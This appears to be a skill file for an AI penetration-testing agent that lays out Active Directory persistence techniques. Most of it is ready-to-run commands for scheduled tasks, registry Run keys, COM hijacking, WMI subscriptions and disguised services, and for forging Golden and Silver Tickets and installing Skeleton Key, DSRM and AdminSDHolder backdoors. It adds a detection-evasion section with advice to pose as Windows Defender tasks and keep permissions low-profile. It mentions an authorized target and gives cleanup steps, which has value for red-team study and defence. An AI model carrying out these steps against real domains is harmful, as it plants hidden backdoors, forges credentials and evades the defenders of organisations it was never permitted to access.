---
name: ad-persistence
description: "AD domain persistence techniques. Use when you already hold domain admin/local administrator rights and need to establish persistent access so you can still return to the target environment after a reboot or password change. Covers host-level persistence (scheduled task/registry Run/COM hijack/WMI event subscription/Windows service/startup folder), domain-level persistence (Golden Ticket/Silver Ticket/Skeleton Key/DSRM/AdminSDHolder), advanced techniques such as DCShadow/GoldenGMSA, cleanup commands, and detection evasion"
zh-signals: "在 AD 域环境建立持久化访问，覆盖主机级与域级技术如 Golden Ticket、DSRM、AdminSDHolder、DCShadow。信号:AD持久化,Golden Ticket,DSRM,AdminSDHolder,DCShadow"
when-to-use: >-
  Use when you hold domain admin or local admin rights and need persistent access that survives
  reboots or password changes on an authorized Active Directory target.
metadata:
  tags: "persistence,golden-ticket,silver-ticket,skeleton-key,dsrm,adminsdholder,scheduled-task,com-hijack,wmi-subscription,registry-run,sharpersist,dcshadow,goldengmsa,shadow-principals,pam-trust,delegation-to-krbtgt,kds-root-key"
  category: "lateral"
---

# AD Persistence Methodology

Core objective after obtaining high privileges: establish persistent access so you can still return to the target environment after a reboot or password change.

## Further Reading (Must Read)

- Full commands and cleanup for host-level persistence → [references/host-persistence.md](references/host-persistence.md)
- Full commands and cleanup for domain-level persistence → [references/domain-persistence.md](references/domain-persistence.md)
- → [references/advanced-persistence.md](references/advanced-persistence.md) — DCShadow, GoldenGMSA, krbtgt delegation persistence, Shadow Principals (PAM Trust)

---

## Phase 1: Persistence Decision

### 1.1 Current Privilege Assessment

```powershell
# Check current privileges
whoami /priv
whoami /groups

# Check whether you are a domain admin
net group "Domain Admins" /domain

# Check whether you are a local administrator
net localgroup Administrators
```

### 1.2 Decision Tree

```
[Start] Need to establish persistence
    |
    v
[Assess] Current privilege level?
    |
    +-- Normal domain user --> Escalate privileges first; persistence has little value
    |
    +-- Local admin / SYSTEM --> [Host-level persistence] Phase 2
    |       |
    |       +-- Need stealth --> COM hijack / WMI event subscription
    |       +-- Need reliability --> Scheduled task / Windows service
    |       +-- User level only --> Registry Run / Startup folder
    |
    +-- Domain admin --> [Domain-level persistence] Phase 3
            |
            +-- Have krbtgt hash --> Golden Ticket (strongest)
            +-- Have service account hash --> Silver Ticket (stealthy)
            +-- Have DC access --> Skeleton Key / DSRM
            +-- Need ACL backdoor --> AdminSDHolder
```

### 1.3 Stealth Assessment

| Technique | Detection Difficulty | Persistence Duration | Privilege Required | Recommended Scenario |
|------|----------|----------|----------|----------|
| Scheduled task | Medium | Permanent | User/SYSTEM | Fast deployment |
| Startup folder | Low | Permanent | User | Temporary/low value |
| Registry Run | Medium | Permanent | User/SYSTEM | General purpose |
| COM hijack | High | Permanent | User | Long-term stealth |
| Windows service | Medium | Permanent | SYSTEM | System-level access |
| WMI event subscription | High | Permanent | SYSTEM | High stealth requirement |
| Golden Ticket | High | 10 years | krbtgt hash | Strongest at domain level |
| Silver Ticket | High | Ticket lifetime | Service account hash | Does not touch the DC |
| Skeleton Key | Medium | Lost on reboot | DC memory access | Temporary master key |
| DSRM | High | Permanent | DC local admin | Stealth backdoor |
| AdminSDHolder | Medium | Permanent (60min sync) | Domain admin | ACL persistence |

---

## Phase 2: Host-Level Persistence

### 2.1 Scheduled Task

**Privilege**: User level or SYSTEM | **Detection Difficulty**: Medium

```powershell
# SharPersist - run every hour
SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64" -n "Updater" -m add -o hourly

# schtasks - run at boot / scheduled execution
schtasks /create /tn "WinDefUpdate" /tr "C:\Windows\Temp\svc.exe" /sc onlogon /ru SYSTEM /f
schtasks /create /tn "HealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc minute /mo 30 /ru SYSTEM /f

# Cleanup
schtasks /delete /tn "WinDefUpdate" /f
```

### 2.2 Startup Folder

**Privilege**: User | **Detection Difficulty**: Low

```powershell
SharPersist.exe -t startupfolder -c "powershell.exe" -a "-nop -w hidden -enc BASE64" -f "UserEnvSetup" -m add
# Path: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\

# Cleanup
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk"
```

### 2.3 Registry Run Key

**Privilege**: User (HKCU) / SYSTEM (HKLM) | **Detection Difficulty**: Medium

```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /f
```

> For more registry locations (Winlogon Shell/Userinit, IFEO) see [references/host-persistence.md](references/host-persistence.md)

### 2.4 COM Hijack

**Privilege**: User | **Detection Difficulty**: High

Principle: register a malicious DLL under the same CLSID in HKCU so it is loaded before the legitimate component in HKLM.

```powershell
# Create the hijack entry in HKCU (the CLSID already exists in HKLM)
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{TARGET-CLSID}"
New-Item -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}" -Name "InprocServer32" -Value "C:\Payloads\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" -Name "ThreadingModel" -Value "Both"

# Cleanup
Remove-Item -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}" -Recurse
```

> For CLSID discovery methods (procmon/scheduled task enumeration) see [references/host-persistence.md](references/host-persistence.md)

### 2.5 Windows Service

**Privilege**: SYSTEM | **Detection Difficulty**: Medium

```bash
sc create "WinDefSvc" binPath= "C:\Windows\legit-svc.exe" start= auto DisplayName= "Windows Defender Update"
sc start "WinDefSvc"

# Cleanup
sc stop "WinDefSvc" && sc delete "WinDefSvc"
```

> A SYSTEM process cannot perform network NTLM authentication; use an SMB/TCP/DNS channel instead of HTTP.

### 2.6 WMI Event Subscription

**Privilege**: SYSTEM | **Detection Difficulty**: High

Three-component architecture: EventFilter (trigger condition) + EventConsumer (action to execute) + FilterToConsumerBinding (binding).

```powershell
# PowerLurk one-shot creation
Import-Module .\PowerLurk.ps1
Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\artifact.exe" -Trigger ProcessStart -ProcessName notepad.exe

# Cleanup
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```

> For the full manual three-component PowerShell/wmic creation code see [references/host-persistence.md](references/host-persistence.md)

---

## Phase 3: Domain-Level Persistence

### 3.1 Golden Ticket

**Requirement**: krbtgt NTLM hash (obtained via DCSync) | **Validity**: 10 years by default

```bash
# Linux: DCSync + forge + use
impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user krbtgt
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

```powershell
# Windows
Rubeus.exe golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /ptt
```

**Cleanup**: change the krbtgt password twice (AD retains the previous password). For cross-domain scenarios and the /sids parameter see references.

### 3.2 Silver Ticket

**Requirement**: service account NTLM hash | **Advantage**: does not touch the DC

```bash
ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/target.domain.local Administrator
```

```powershell
Rubeus.exe silver /service:cifs/TARGET /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /rc4:SVC_HASH /ptt
```

Common SPNs: `cifs/HOST` (files), `HOST/DC` (PsExec), `MSSQLSvc/DB` (SQL), `LDAP/DC` (DCSync). **Cleanup**: change the service account password.

### 3.3 Skeleton Key

**Requirement**: DC memory access (domain admin + SeDebugPrivilege) | **Validity**: until the DC reboots

```powershell
mimikatz # privilege::debug
mimikatz # misc::skeleton
# All domain users can log in with the password "mimikatz"; original passwords remain valid
```

**Cleanup**: simply reboot the domain controller. Memory-only, so it must be combined with other techniques.

### 3.4 DSRM (Directory Service Restore Mode)

**Requirement**: DC local admin | **Validity**: permanent

```powershell
mimikatz # lsadump::sam                  # Obtain the DSRM hash (Administrator in the SAM)
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
sekurlsa::pth /domain:DC_HOSTNAME /user:Administrator /ntlm:DSRM_HASH /run:powershell.exe
```

**Cleanup**: `Remove-ItemProperty "HKLM:\...\Lsa\" -Name "DsrmAdminLogonBehavior"`

### 3.5 AdminSDHolder

**Requirement**: domain admin | SDProp syncs the ACL to all protected objects every 60 minutes

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
```

```bash
impacket-dacledit -action write -rights FullControl -principal attacker -target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" DOMAIN/admin:PASS -dc-ip DC_IP
```

**Cleanup**: `Remove-DomainObjectAcl ... -PrincipalIdentity attacker -Rights All` + wait for SDProp sync

---

## Phase 4: Cleanup and Detection Evasion

### 4.1 Cleanup Command Quick Reference

| Technique | Install Command | Cleanup Command |
|------|----------|----------|
| Scheduled task | `schtasks /create /tn NAME ...` | `schtasks /delete /tn NAME /f` |
| Startup folder | SharPersist `-m add` | `Remove-Item ...Startup\NAME.lnk` |
| Registry Run | `reg add ...Run /v NAME` | `reg delete ...Run /v NAME /f` |
| COM hijack | `New-Item HKCU:...CLSID` | `Remove-Item HKCU:...CLSID -Recurse` |
| Windows service | `sc create NAME` | `sc stop NAME && sc delete NAME` |
| WMI event | `Register-MaliciousWmiEvent` | `Get-WmiEvent NAME \| Remove-WmiObject` |
| Golden Ticket | `ticketer.py -nthash` | Change the krbtgt password twice |
| Silver Ticket | `ticketer.py -spn` | Change the service account password |
| Skeleton Key | `misc::skeleton` | Reboot the domain controller |
| DSRM | Modify DsrmAdminLogonBehavior | Delete the registry value |
| AdminSDHolder | `Add-DomainObjectAcl` | `Remove-DomainObjectAcl` + wait for SDProp |

### 4.2 Detection Evasion Essentials

```
Host-level:
  - Mimic legitimate system task names (Windows Defender, Microsoft Update)
  - Place binaries in legitimate paths (C:\Windows, C:\ProgramData)
  - Use DLL hijacking instead of a standalone EXE
  - Set a reasonable interval on WMI trigger conditions to avoid frequent execution

Domain-level:
  - Use a real existing username for the Golden Ticket
  - Target only the specific service you need with the Silver Ticket
  - Avoid using forged tickets across domains (anomalous logs)
  - Grant low-profile permissions instead of FullControl for AdminSDHolder
```

---

## Combination Strategies

```
Maximum persistence (multi-layer redundancy):
  Domain admin: Golden Ticket + AdminSDHolder + Scheduled task
  Local admin: WMI event subscription + COM hijack + Registry Run

Maximum stealth (single precise technique):
  Domain admin: Silver Ticket (specific service only, does not touch the DC)
  Local admin: COM hijack (DLL form, highest detection difficulty)
```

---

## FAQ

- **Scheduled task deleted?** -- Switch to COM hijack or WMI event subscription; all three WMI components must be deleted to fully clear it
- **Golden Ticket not working?** -- Confirm the krbtgt hash is correct, the domain SID is correct, and clock skew is < 5 minutes
- **Skeleton Key lost after reboot?** -- By design (memory-only); combine it with a Golden Ticket or a scheduled task
- **AdminSDHolder not taking effect?** -- SDProp runs every 60 minutes; trigger it manually with `Invoke-ADSDPropagation`

---

## Tool Reference

| Tool | Purpose | Platform |
|------|------|------|
| SharPersist | Multiple host persistence techniques (task/registry/service/COM/startup) | Windows |
| PowerLurk | WMI event subscription | Windows |
| SharpStay | C# persistence tool | Windows |
| Rubeus | Golden/Silver Ticket creation | Windows |
| Mimikatz | Skeleton Key/DSRM/ticket forging | Windows |
| ticketer.py | Kerberos ticket forging (impacket) | Linux |
| impacket-secretsdump | DCSync hash retrieval | Linux |
| impacket-dacledit | ACL modification (AdminSDHolder) | Linux |
| Incognito | Token theft and impersonation | Windows |
